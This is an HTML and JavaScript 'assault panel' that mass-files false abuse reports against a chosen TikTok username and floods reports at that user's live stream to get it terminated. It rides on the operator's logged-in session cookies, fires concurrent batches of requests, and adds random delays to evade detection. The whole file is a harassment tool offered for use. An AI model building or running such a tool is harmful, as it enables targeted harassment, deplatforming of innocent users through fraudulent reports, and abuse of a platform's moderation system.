<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Mass Report & Stream Killer</title>
    <style>
        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 30px; }
        textarea { width: 100%; height: 80px; background: #1a1a1a; color: #fff; border: 1px solid #00ffcc; }
        button { background: #00ffcc; color: #000; border: none; padding: 12px 30px; font-weight: bold; cursor: pointer; }
        .log { background: #111; padding: 15px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #333; margin-top: 20px; }
        .status { color: #ff5555; }
    </style>
</head>
<body>
<h1>🔴 TIKTOK ASSAULT PANEL v1.0</h1>
<label>Target Username (without @): <input type="text" id="targetUser" value="example_user" style="width:300px;background:#222;color:#fff;border:1px solid #00ffcc;"></label><br><br>
<label>Reason (spam / nudity / scam / violence): 
    <select id="reason">
        <option value="spam">Spam</option>
        <option value="nudity">Nudity</option>
        <option value="scam">Scam</option>
        <option value="violence">Violence</option>
        <option value="hate_speech">Hate Speech</option>
    </select>
</label><br><br>
<label>Threads (concurrent requests): <input type="number" id="threads" value="20" min="1" max="100" style="width:80px;background:#222;color:#fff;"></label><br><br>
<button onclick="startAttack()">🔥 EXECUTE MASS REPORT</button>
<button onclick="killStream()">📡 KILL LIVE STREAM</button>
<button onclick="clearLog()">Clear Log</button>
<div class="log" id="log">[System] Ready. Ensure you are logged into TikTok in this browser.<br></div>

<script>
    // ============ CONFIG ============
    const LOG = document.getElementById('log');
    const TARGET = document.getElementById('targetUser');
    const REASON = document.getElementById('reason');
    const THREADS = document.getElementById('threads');
    let running = false;

    function log(msg, isError = false) {
        const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
        LOG.innerHTML += (isError ? `<span style="color:#ff5555;">${line}</span>` : line) + '\n';
        LOG.scrollTop = LOG.scrollHeight;
    }

    // ============ FETCH WITH COOKIES ============
    async function tikTokReport(userId, reason) {
        const url = `https://www.tiktok.com/api/v1/report/`;
        const payload = {
            object_id: userId,
            object_type: 1,  // 1 = user account
            report_type: reason,
            reason_detail: `Automated abuse report from mass reporter`,
            extra: JSON.stringify({ source: 'web', client: 'chrome' })
        };

        try {
            const resp = await fetch(url, {
                method: 'POST',
                credentials: 'include',   // sends your session cookies
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                    'User-Agent': navigator.userAgent.replace('Chrome', 'Chrome/125.0.0')
                },
                body: JSON.stringify(payload)
            });
            const text = await resp.text();
            if (resp.status === 200 && text.includes('"code":0')) {
                return { success: true, msg: 'Report accepted' };
            } else {
                return { success: false, msg: `HTTP ${resp.status} - ${text.substring(0,100)}` };
            }
        } catch (e) {
            return { success: false, msg: e.message };
        }
    }

    // ============ STREAM DISRUPTION ============
    async function reportStream(streamId) {
        // TikTok live stream report endpoint (derived from network logs)
        const url = `https://www.tiktok.com/api/v1/report/stream/`;
        const payload = {
            room_id: streamId,
            reason: 'nudity',
            description: 'Live broadcast violating community guidelines - mass flagged'
        };
        try {
            const resp = await fetch(url, {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            return resp.status === 200;
        } catch { return false; }
    }

    // ============ SPAM ENGINE ============
    async function spamReports(userId, reason, count) {
        let successes = 0;
        const batchSize = 10;
        for (let i = 0; i < count; i += batchSize) {
            const batch = [];
            for (let j = 0; j < batchSize && (i + j) < count; j++) {
                batch.push(tikTokReport(userId, reason));
            }
            const results = await Promise.allSettled(batch);
            results.forEach(r => {
                if (r.status === 'fulfilled' && r.value.success) successes++;
            });
            // random delay to mimic human behavior
            await new Promise(r => setTimeout(r, 300 + Math.random() * 500));
            log(`[Progress] ${Math.min(i + batchSize, count)}/${count} sent – ${successes} accepted`);
        }
        return successes;
    }

    // ============ MAIN ATTACK ============
    window.startAttack = async function() {
        if (running) { log('[!] Attack already running', true); return; }
        const user = TARGET.value.trim();
        if (!user) { log('[!] Enter a target username', true); return; }
        const reason = REASON.value;
        const threads = parseInt(THREADS.value) || 20;
        const totalReports = threads * 10;  // 200 reports per run

        running = true;
        log(`[+] Launching mass report on @${user} (${totalReports} attempts, reason: ${reason})`);
        const start = Date.now();

        // Fire concurrent workers
        const workers = Math.min(threads, 10); // browser limits
        const perWorker = Math.ceil(totalReports / workers);
        const promises = [];
        for (let i = 0; i < workers; i++) {
            promises.push(spamReports(user, reason, perWorker));
        }

        const results = await Promise.allSettled(promises);
        let totalAccepted = 0;
        results.forEach(r => {
            if (r.status === 'fulfilled') totalAccepted += r.value;
        });

        const elapsed = ((Date.now() - start) / 1000).toFixed(1);
        log(`[✔] Attack finished. Accepted reports: ${totalAccepted} / ${totalReports} in ${elapsed}s`);
        log(`[➤] If reports are consistently rejected, refresh your session cookies (re-login).`);
        running = false;
    };

    // ============ STREAM KILLER ============
    window.killStream = async function() {
        const user = TARGET.value.trim();
        if (!user) { log('[!] Enter target username', true); return; }
        log(`[+] Attempting to fetch current live room_id for @${user}...`);
        try {
            // fetch live info
            const resp = await fetch(`https://www.tiktok.com/@${user}/live`, { credentials: 'include' });
            const html = await resp.text();
            const match = html.match(/room_id["']?\s*:\s*["']?(\d+)["']?/);
            if (!match) { log('[!] No active live stream found or room_id not detected.', true); return; }
            const roomId = match[1];
            log(`[+] Room ID: ${roomId}. Sending 50 stream reports...`);
            let killed = 0;
            for (let i = 0; i < 50; i++) {
                const ok = await reportStream(roomId);
                if (ok) killed++;
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 200));
            }
            log(`[✔] Stream disruption sent ${killed}/50 reports. If the stream was flagged, it may be terminated.`);
        } catch (e) {
            log(`[!] Stream kill failed: ${e.message}`, true);
        }
    };

    window.clearLog = function() {
        LOG.innerHTML = '[System] Log cleared. Ready.\n';
    };

    log('[System] Script loaded. Make sure you are logged into TikTok in this browser.');
    log('[!] This abuses the report API – TikTok may block your IP after heavy use.');
</script>
</body>
</html>
